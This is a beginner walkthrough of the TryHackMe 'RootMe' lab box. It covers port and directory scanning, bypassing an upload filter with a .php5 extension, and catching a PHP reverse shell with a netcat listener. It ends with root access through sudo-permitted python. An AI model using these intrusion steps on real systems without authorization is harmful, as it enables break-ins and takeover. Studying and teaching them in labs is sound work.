# RootMe
A guide to the thm box rootme

## 🔓 RootMe — TryHackMe Walkthrough (Beginner-Friendly)

RootMe is one of the most popular beginner-friendly boxes on TryHackMe. It’s perfect if you're just getting into web exploitation and privilege escalation on Linux. Here's how I tackled it step-by-step.

---

### 🛍️ Step 1: Reconnaissance

I kicked things off with a basic Nmap scan:

```bash
nmap -sV -sC -Pn <target-IP>
```

**Open ports:**
- `22/tcp` — SSH
- `80/tcp` — HTTP

Visiting the site on port 80 showed a basic static webpage — nothing interactive or useful at first glance.

To dig deeper, I ran a **directory brute-force scan**:

```bash
gobuster dir -u http://<target-IP> -w /usr/share/wordlists/dirb/common.txt
```

**Interesting findings:**
- `/panel.php`
- `/uploads/`

---

### 🛠️ Step 2: File Upload Exploit

Accessing `/panel.php` showed a **file upload form**. My first instinct was to upload a PHP reverse shell.

Tried uploading `shell.php` → Blocked.  
Tried `shell.jpg.php` → Still blocked.

Then I remembered a common bypass: using alternative extensions.

📌 **Trick:** Uploaded `shell.php5` — and it worked!

---

### 📲 Step 3: Getting a Reverse Shell

I grabbed a basic PHP reverse shell from [Pentestmonkey](http://pentestmonkey.net/tools/php-reverse-shell), set my IP and port, then uploaded it as `shell.php5`.

Set up a Netcat listener:

```bash
nc -lvnp 4444
```

Then visited:  
`http://<target-IP>/uploads/shell.php5`

Boom — got a shell as `www-data`.

---

### 🚀 Step 4: Privilege Escalation

From the limited shell, I started checking basic privilege escalation paths.

```bash
sudo -l
```

And there it was — a sweet finding:

```bash
(ALL) NOPASSWD: /usr/bin/python
```

So I ran:

```bash
sudo python -c 'import pty; import os; os.system("/bin/bash")'
```

And just like that, I had **root access**.

---

### 🏁 Step 5: Grab the Flags

```bash
cat /home/user/user.txt
cat /root/root.txt
```

Flags captured ✅  
Box rooted ✅

---

### 💭 Final Thoughts

RootMe is a great intro box that teaches:
- File upload vulnerabilities
- PHP reverse shells
- Simple sudo-based privilege escalation

If you're new to CTFs or just getting started with web exploits, definitely give this one a go.

---

If you found this useful or have any questions, feel free to drop a comment or connect. Happy hacking! 💻🔐

